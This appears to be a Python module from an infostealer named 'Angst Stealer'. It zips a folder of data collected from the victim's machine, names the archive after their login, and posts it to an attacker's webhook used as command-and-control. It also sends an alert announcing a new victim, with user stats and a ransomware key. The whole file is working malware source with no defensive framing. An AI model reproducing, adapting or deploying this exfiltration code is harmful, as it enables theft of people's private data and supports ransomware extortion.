import requests
import os
import zipfile

class Send(object):
    """
    Sends content to our webhook acting as a cnc
    """
    def __init__(self, webhook, userdata, ransomware_key, renabled):
        self.webhook = webhook
        self.userdata = userdata
        self.ransomware_key = ransomware_key
        self.renabled = renabled
        self.send_file()

    def zip_dir(self, path, zipf):
        """
        Zips the folder path
        """
        for root, dirs, files in os.walk(path):
            for file in files:
                zipf.write(os.path.join(path, file), file)

    def send_file(self):
        """
        Sends our current zipped angst directory to our webhook
        """
        ap = os.getenv("LOCALAPPDATA")
        temp = os.path.join(ap, "Angst")
        new = os.path.join(ap, 'Angst-[%s].zip' % os.getlogin())
        zipf = zipfile.ZipFile(new, 'w', zipfile.ZIP_DEFLATED)
        self.zip_dir(temp, zipf)
        zipf.close()
        if self.renabled == False: key = "Ransomware: Not Enabled"
        else: key = "RansomwareKey: %s" % self.ransomware_key.decode()
        alert = {
                  "avatar_url":"https://i.imgur.com/tkQZZL2.png",
                  "name":"Angst Stealer",
                  "embeds": [
                    {
                      "title": "Angst Stealer",
                      "description": "A new victim has run Angst, here are the current user stats of the user:\n ```asciidoc\n%s\n%s\n```" % (self.userdata, key),
                      "color": 15146294,

                      "thumbnail": {
                        "url": "https://i.imgur.com/tkQZZL2.png"
                      }
                    }
                  ]
                }
        requests.post(self.webhook,json=alert)
        requests.post(self.webhook, files={'upload_file': open(new,'rb')})

